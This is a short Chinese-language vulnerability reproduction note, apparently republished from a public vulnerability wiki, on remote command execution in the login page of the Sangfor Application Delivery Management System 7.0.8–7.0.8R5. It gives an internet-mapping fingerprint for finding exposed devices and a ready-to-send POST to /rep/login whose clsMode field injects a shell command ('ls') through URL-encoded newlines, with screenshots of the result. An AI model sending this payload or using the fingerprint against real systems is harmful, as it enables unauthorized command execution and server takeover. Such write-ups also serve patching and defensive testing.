---
title: "深信服 应用交付管理系统 login 远程命令执行漏洞"
date: 2026-10-16 09:11:05
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 漏洞影响

深信服 应用交付管理系统 7.0.8-7.0.8R5

## 网络测绘

```
fid="iaytNA57019/kADk8Nev7g=="
```

## 漏洞复现

登陆页面

![image-20230828164544551](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828164544551.png)

验证POC

```
POST /rep/login 

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

![image-20230828164602536](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828164602536.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
